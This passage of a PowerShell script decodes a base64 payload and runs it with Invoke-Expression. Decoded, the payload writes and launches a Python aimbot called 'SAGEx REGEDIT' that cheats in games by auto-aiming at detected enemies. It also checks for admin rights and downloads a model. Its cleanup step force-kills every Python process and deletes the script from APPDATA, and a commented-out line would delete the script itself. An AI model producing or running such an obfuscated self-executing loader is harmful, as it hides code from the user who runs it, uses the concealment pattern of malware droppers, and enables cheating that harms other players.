AgICB3aW5kb3dbJy1EQVNIQ09PTERPV04tJ10udXBkYXRlKGNvb2xkb3duX3BlcmNlbnQpDQogICAgICAgICAgICANCiAgICAgICAgICAgIGNvbmZpZy5jb25maWRlbmNlID0gZmxvYXQodmFsdWVzWyctQ09ORklERU5DRS0nXSkNCiAgICAgICAgICAgIGNvbmZpZy5zbW9vdGhuZXNzID0gZmxvYXQodmFsdWVzWyctU01PT1RITkVTUy0nXSkNCiAgICAgICAgICAgIGlmIGNvbmZpZy5yZWdpb25fc2l6ZSAhPSBpbnQodmFsdWVzWyctUkVHSU9OLSddKToNCiAgICAgICAgICAgICAgICBjb25maWcucmVnaW9uX3NpemUgPSBpbnQodmFsdWVzWyctUkVHSU9OLSddKQ0KICAgICAgICAgICAgICAgIGNvbmZpZy51cGRhdGVfc2NyZWVuX3BhcmFtcygpDQogICAgICAgICAgICBjb25maWcuZW5hYmxlX3NvdW5kID0gYm9vbCh2YWx1ZXNbJy1TT1VORC0nXSkNCiAgICAgICAgICAgIGNvbmZpZy5kYXNoX2tleSA9IHN0cih2YWx1ZXNbJy1EQVNIS0VZLSddKQ0KICAgICAgICAgICAgY29uZmlnLmRhc2hfZHVyYXRpb24gPSBmbG9hdCh2YWx1ZXNbJy1EQVNIRFVSQVRJT04tJ10pDQogICAgICAgICAgICBjb25maWcuZGFzaF9jb29sZG93biA9IGZsb2F0KHZhbHVlc1snLURBU0hDT09MRE9XTl9TTElERVItJ10pDQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIGNvbmZpZy5hY3RpdmUgYW5kIGxtYl9oZWxkKCk6DQogICAgICAgICAgICAgICAgdGFyZ2V0ID0gZGV0ZWN0X2VuZW15KGNvbmZpZywgbW9kZWwpDQogICAgICAgICAgICAgICAgaWYgdGFyZ2V0Og0KICAgICAgICAgICAgICAgICAgICBzbW9vdGhfYWltX3RvKGNvbmZpZywgKnRhcmdldCkNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdGltZS5zbGVlcChtYXgoY29uZmlnLnNjYW5faW50ZXJ2YWwsIDAuMDEpKQ0KICAgICAgICANCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHByaW50KGYiW0NSSVRJQ0FMXSBNYWluIGxvb3AgZXJyb3I6IHtzdHIoZSl9IikNCiAgICBmaW5hbGx5Og0KICAgICAgICB3aW5kb3cuY2xvc2UoKQ0KICAgICAgICBwcmludCgiWytdIFNBR0V4IFJFR0VESVQgc2h1dGRvd24gY29tcGxldGUiKQ0KDQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOg0KICAgIG1haW4oKQ0KJ0AgfCBPdXQtRmlsZSAtRmlsZVBhdGggJHRlbXBQeSAtRW5jb2RpbmcgdXRmOCAtRm9yY2UNCn0NCg0KIyBNYWluIGV4ZWN1dGlvbg0KdHJ5IHsNCiAgICAjIFNob3cgY29uc29sZSB3aW5kb3cgaWYgaGlkZGVuDQogICAgU2hvdy1Db25zb2xlDQogICAgDQogICAgIyBDaGVjayBhZG1pbiAobm90IHJlcXVpcmVkIGJ1dCByZWNvbW1lbmRlZCkNCiAgICBpZiAoLW5vdCAoVGVzdC1BZG1pbikpIHsNCiAgICAgICAgV3JpdGUtSG9zdCAiWyFdIFdhcm5pbmc6IFJ1bm5pbmcgd2l0aG91dCBhZG1pbiBwcml2aWxlZ2VzIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvdw0KICAgIH0NCiAgICANCiAgICAjIENoZWNrIFB5dGhvbg0KICAgIFdyaXRlLUhvc3QgIlsrXSBDaGVja2luZyBQeXRob24uLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgQ3lhbg0KICAgIHRyeSB7DQogICAgICAgICRweXRob25WZXJzaW9uID0gKCYgcHl0aG9uIC0tdmVyc2lvbiAyPiYxIHwgT3V0LVN0cmluZykuVHJpbSgpDQogICAgICAgIGlmICgtbm90ICRweXRob25WZXJzaW9uIC1vciAkcHl0aG9uVmVyc2lvbiAtbWF0Y2ggIm5vdCBmb3VuZCIpIHsNCiAgICAgICAgICAgIHRocm93ICJQeXRob24gbm90IGZvdW5kIg0KICAgICAgICB9DQogICAgICAgIFdyaXRlLUhvc3QgIiAgLSBGb3VuZCAkcHl0aG9uVmVyc2lvbiIgLUZvcmVncm91bmRDb2xvciBHcmVlbg0KICAgIH0NCiAgICBjYXRjaCB7DQogICAgICAgIFdyaXRlLUhvc3QgIlstXSBQeXRob24gaXMgcmVxdWlyZWQuIEluc3RhbGwgZnJvbSBodHRwczovL3d3dy5weXRob24ub3JnLyIgLUZvcmVncm91bmRDb2xvciBSZWQNCiAgICAgICAgcGF1c2UNCiAgICAgICAgZXhpdCAxDQogICAgfQ0KICAgIA0KICAgICMgSW5zdGFsbCBwYWNrYWdlcw0KICAgIEluc3RhbGwtUGFja2FnZXMNCiAgICANCiAgICAjIFZlcmlmeSBvciBkb3dubG9hZCBtb2RlbA0KICAgIGlmICgtbm90IChUZXN0LU1vZGVsKSkgew0KICAgICAgICBXcml0ZS1Ib3N0ICJbIV0gTW9kZWwgbm90IGZvdW5kIG9yIGludmFsaWQuIERvd25sb2FkaW5nLi4uIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvdw0KICAgICAgICBpZiAoLW5vdCAoR2V0LU1vZGVsKSkgew0KICAgICAgICAgICAgV3JpdGUtSG9zdCAiWy1dIEZhaWxlZCB0byBpbml0aWFsaXplIG1vZGVsLiBFeGl0aW5nLi4uIiAtRm9yZWdyb3VuZENvbG9yIFJlZA0KICAgICAgICAgICAgcGF1c2UNCiAgICAgICAgICAgIGV4aXQgMQ0KICAgICAgICB9DQogICAgfQ0KICAgIFdyaXRlLUhvc3QgIlsrXSBNb2RlbCB2ZXJpZmllZCBzdWNjZXNzZnVsbHkhIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuDQogICAgDQogICAgIyBDcmVhdGUgUHl0aG9uIHNjcmlwdA0KICAgIENyZWF0ZS1QeXRob25TY3JpcHQNCiAgICANCiAgICAjIExhdW5jaCB0aGUgYWltYm90DQogICAgV3JpdGUtSG9zdCAiWytdIExhdW5jaGluZyBTQUdFeCBSRUdFRElUIFYyLjEuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4NCiAgICAmIHB5dGhvbiAkdGVtcFB5DQogICAgDQogICAgV3JpdGUtSG9zdCAiWytdIFNjcmlwdCBjb21wbGV0ZWQgc3VjY2Vzc2Z1bGx5IiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuDQp9DQpjYXRjaCB7DQogICAgV3JpdGUtSG9zdCAiWy1dIEVSUk9SOiAkXyIgLUZvcmVncm91bmRDb2xvciBSZWQNCiAgICBXcml0ZS1Ib3N0ICJbLV0gU3RhY2sgVHJhY2U6ICQoJF8uU2NyaXB0U3RhY2tUcmFjZSkiIC1Gb3JlZ3JvdW5kQ29sb3IgRGFya1JlZA0KICAgIHBhdXNlDQp9DQpmaW5hbGx5IHsNCiAgICAjIENsZWFudXAgaWYgbmVlZGVkDQogICAgV3JpdGUtSG9zdCAiWytdIENsZWFuaW5nIHVwLi4uIiAtRm9yZWdyb3VuZENvbG9yIEN5YW4NCglmdW5jdGlvbiBGb3JjZS1SZW1vdmVTQUdFeEZpbGVzIHsNCiAgICAkYXBwRGF0YUZvbGRlciA9ICIkZW52OkFQUERBVEFcU0FHRXggUkVHRURJVCINCiAgICAkcHl0aG9uU2NyaXB0ID0gIiRhcHBEYXRhRm9sZGVyXFNBR0V4IFJFR0VESVQucHkiDQoNCiAgICBpZiAoVGVzdC1QYXRoICRweXRob25TY3JpcHQpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICMgS2lsbCBQeXRob24gaWYgcnVubmluZw0KICAgICAgICAgICAgR2V0LVByb2Nlc3MgcHl0aG9uIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgU3RvcC1Qcm9jZXNzIC1Gb3JjZQ0KICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gLVBhdGggJHB5dGhvblNjcmlwdCAtRm9yY2UgLUVycm9yQWN0aW9uIFN0b3ANCiAgICAgICAgICAgIFdyaXRlLUhvc3QgIlsrXSBTdWNjZXNzZnVsbHkgZGVsZXRlZCBTQUdFeCBSRUdFRElULnB5IiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuDQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggew0KICAgICAgICAgICAgV3JpdGUtSG9zdCAiWyFdIEZhaWxlZCB0byBkZWxldGUgU0FHRXggUkVHRURJVC5weTogJF8iIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkDQogICAgICAgIH0NCiAgICB9DQp9DQoNCkZvcmNlLVJlbW92ZVNBR0V4RmlsZXMNCldyaXRlLUhvc3QgIlsrXSBDbGVhbmVkIHVwLi4uIiAtRm9yZWdyb3VuZENvbG9yIEN5YW4NCg0KfQ==';
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload));
Invoke-Expression $decoded;

# Optional auto-delete:
# Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
